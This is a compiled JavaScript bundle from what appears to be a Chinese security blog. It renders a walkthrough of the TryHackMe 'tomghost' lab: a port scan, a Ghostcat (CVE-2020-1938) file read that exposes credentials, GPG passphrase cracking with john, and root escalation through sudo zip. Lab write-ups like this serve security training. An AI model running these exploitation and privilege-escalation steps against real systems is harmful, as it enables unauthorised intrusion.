"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[114],{76480:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>r,toc:()=>l});var s=t(74848),a=t(28453);const o={sidebar_position:14,tags:["Easy","Linux","Tomcat","\u6587\u4ef6\u5305\u542b","\u4fe1\u606f\u6cc4\u9732","\u5bc6\u7801\u5b66","SUDO"],title:"tomghost",sidebar_label:"tomghost"},i="tomghost",r={id:"box/TryHackMe/14",title:"tomghost",description:"\u7aef\u53e3\u626b\u63cf",source:"@site/docs/box/TryHackMe/14.md",sourceDirName:"box/TryHackMe",slug:"/box/TryHackMe/14",permalink:"/docs/box/TryHackMe/14",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"Tomcat",permalink:"/docs/tags/tomcat"},{label:"\u6587\u4ef6\u5305\u542b",permalink:"/docs/tags/\u6587\u4ef6\u5305\u542b"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"\u5bc6\u7801\u5b66",permalink:"/docs/tags/\u5bc6\u7801\u5b66"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:14,frontMatter:{sidebar_position:14,tags:["Easy","Linux","Tomcat","\u6587\u4ef6\u5305\u542b","\u4fe1\u606f\u6cc4\u9732","\u5bc6\u7801\u5b66","SUDO"],title:"tomghost",sidebar_label:"tomghost"},sidebar:"boxSidebar",previous:{title:"Skynet",permalink:"/docs/box/TryHackMe/13"},next:{title:"Brooklyn Nine Nine",permalink:"/docs/box/TryHackMe/15"}},c={},l=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"8080 - tomcat",id:"8080---tomcat",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"skyfuck",id:"skyfuck",level:3},{value:"skyfuck --&gt; merlin",id:"skyfuck----merlin",level:3},{value:"skyfuck \u2014&gt; merlin",id:"skyfuck--merlin",level:2},{value:"merlin \u2014&gt; root",id:"merlin--root",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"tomghost",children:"tomghost"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-55-94:~# rustscan -a 10.10.140.92 -u 5000 -t 1000 -p 22,53,8009,8080 -- -sTCV\nPORT     STATE SERVICE    REASON  VERSION\n22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQvC8xe2qKLoPG3vaJagEW2eW4juBu9nJvn53nRjyw7y/0GEWIxE1KqcPXZiL+RKfkKA7RJNTXN2W9kCG8i6JdVWs2x9wD28UtwYxcyo6M9dQ7i2mXlJpTHtSncOoufSA45eqWT4GY+iEaBekWhnxWM+TrFOMNS5bpmUXrjuBR2JtN9a9cqHQ2zGdSlN+jLYi2Z5C7IVqxYb9yw5RBV5+bX7J4dvHNIs3otGDeGJ8oXVhd+aELUN8/C2p5bVqpGk04KI2gGEyU611v3eOzoP6obem9vsk7Kkgsw7eRNt1+CBrwWldPr8hy6nhA6Oi5qmJgK1x+fCmsfLSH3sz1z4Ln\n|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOscw5angd6i9vsr7MfCAugRPvtx/aLjNzjAvoFEkwKeO53N01Dn17eJxrbIWEj33sp8nzx1Lillg/XM+Lk69CQ=\n|   256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqgzoXzgz5QIhEWm3+Mysrwk89YW2cd2Nmad+PrE4jw\n53/tcp   open  tcpwrapped syn-ack\n8009/tcp open  ajp13      syn-ack Apache Jserv (Protocol v1.3)\n| ajp-methods: \n|_  Supported methods: GET HEAD POST OPTIONS\n8080/tcp open  http       syn-ack Apache Tomcat 9.0.30\n|_http-favicon: Apache Tomcat\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Apache Tomcat/9.0.30\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,s.jsx)(n.h2,{id:"8080---tomcat",children:"8080 - tomcat"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u8bbf\u95ee 8080 \u7aef\u53e3\uff0c \u53d1\u73b0\u5176\u5bf9\u5e94\u7684\u7248\u672c\uff0c\u6211\u4eec\u8fdb\u884c\u8c37\u6b4c\u53d1\u73b0\u5176\u5b58\u5728\u5bf9\u5e94\u7684\u6f0f\u6d1e ",(0,s.jsx)(n.a,{href:"https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md",children:"CVE-2020-1938"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240529102249.png",alt:"20240529102249"})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u4e0b\u8f7d\u811a\u672c\u8fdb\u884c\u67e5\u770b\uff0c \u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6\u4e2d\u7ed9\u51fa\u4e86\u6211\u4eec\u7684 SSH  \u5e10\u53f7"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-55-94:~# python2 CVE-2020-1938.py  10.10.140.92 -p 8009  -f WEB-INF/web.xml\nGetting resource at ajp13://10.10.140.92:8009/asdf\n----------------------------\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!--\n Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the "License"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n      http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an "AS IS" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n--\x3e\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee\n                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"\n  version="4.0"\n  metadata-complete="true">\n\n  <display-name>Welcome to Tomcat</display-name>\n  <description>\n     Welcome to GhostCat\n\tskyfuck:8730281lkjlkjdqlksalks\n  </description>\n'})}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"skyfuck",children:"skyfuck"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240529102316.png",alt:"20240529102316"})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u5728\u6b64\u53d1\u73b0\u4e86\u4e00\u4e2a gpg \u548c\u4e00\u4e2a asc \u6587\u4ef6\uff0c \u6211\u4eec\u5bfc\u5165\u8fdb\u884c\u89e3\u5bc6\uff0c \u4f46\u662f\u9700\u8981\u5bc6\u7801"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'skyfuck@ubuntu:~$ gpg --import tryhackme.asc\ngpg: directory `/home/skyfuck/.gnupg\' created\ngpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf\' created\ngpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf\' are not yet active during this run\ngpg: keyring `/home/skyfuck/.gnupg/secring.gpg\' created\ngpg: keyring `/home/skyfuck/.gnupg/pubring.gpg\' created\ngpg: key C6707170: secret key imported\ngpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created\ngpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported\ngpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed\ngpg: Total number processed: 2\ngpg:               imported: 1\ngpg:              unchanged: 1\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\nskyfuck@ubuntu:~$ gpg --decrypt credential.pgp\n\nYou need a passphrase to unlock the secret key for\nuser: "tryhackme <stuxnet@tryhackme.com>"\n1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)\n\ngpg: gpg-agent is not available in this session\ngpg: Invalid passphrase; please try again ...\n\nYou need a passphrase to unlock the secret key for\nuser: "tryhackme <stuxnet@tryhackme.com>"\n1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)\n\nEnter passphrase: \ngpg: Interrupt caught ... exiting\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u89e3\u5bc6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-55-94:~# gpg2john tryhackme.asc \n\nFile tryhackme.asc\ntryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc\nroot@ip-10-10-55-94:~# gpg2john tryhackme.asc > hash.txt\n\nFile tryhackme.asc\nroot@ip-10-10-55-94:~# john hash.txt --wordlist=`locate rockyou.txt`\nWarning: detected hash type "gpg", but the string is also recognized as "gpg-opencl"\nUse the "--format=gpg-opencl" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65536 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n**alexandru**        (tryhackme)\n1g 0:00:00:00 DONE (2023-08-05 03:35) 9.090g/s 9745p/s 9745c/s 9745C/s chinita..alexandru\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed. \nroot@ip-10-10-55-94:~#\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u6211\u4eec\u4f7f\u7528\u5bc6\u7801\u89e3\u5bc6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'skyfuck@ubuntu:~$ gpg --decrypt credential.pgp\n\nYou need a passphrase to unlock the secret key for\nuser: "tryhackme <stuxnet@tryhackme.com>"\n1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)\n\ngpg: gpg-agent is not available in this session\ngpg: WARNING: cipher algorithm CAST5 not found in recipient preferences\ngpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11\n      "tryhackme <stuxnet@tryhackme.com>"\nmerlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j\n'})}),"\n",(0,s.jsx)(n.h3,{id:"skyfuck----merlin",children:"skyfuck --\x3e merlin"}),"\n",(0,s.jsx)(n.h2,{id:"skyfuck--merlin",children:"skyfuck \u2014> merlin"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"skyfuck@ubuntu:/home$ su merlin\nPassword: \nmerlin@ubuntu:/home$ id\nuid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)\n"})}),"\n",(0,s.jsx)(n.h3,{id:"merlin--root",children:"merlin \u2014> root"}),"\n",(0,s.jsxs)(n.p,{children:["\u6211\u4eec\u6267\u884c ",(0,s.jsx)(n.code,{children:"sudo -l"})," \u53d1\u73b0\u6211\u4eec\u53ef\u4ee5\u4ee5 root \u8eab\u4efd\u8fd0\u884c zip"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"merlin@ubuntu:/home$ TF=$(mktemp -u)\nmerlin@ubuntu:/home$ sudo /usr/bin/zip  $TF /etc/hosts -T -TT 'sh #'\n  adding: etc/hosts (deflated 31%)\n# id\nuid=0(root) gid=0(root) groups=0(root)\n"})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>r});var s=t(96540);const a={},o=s.createContext(a);function i(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);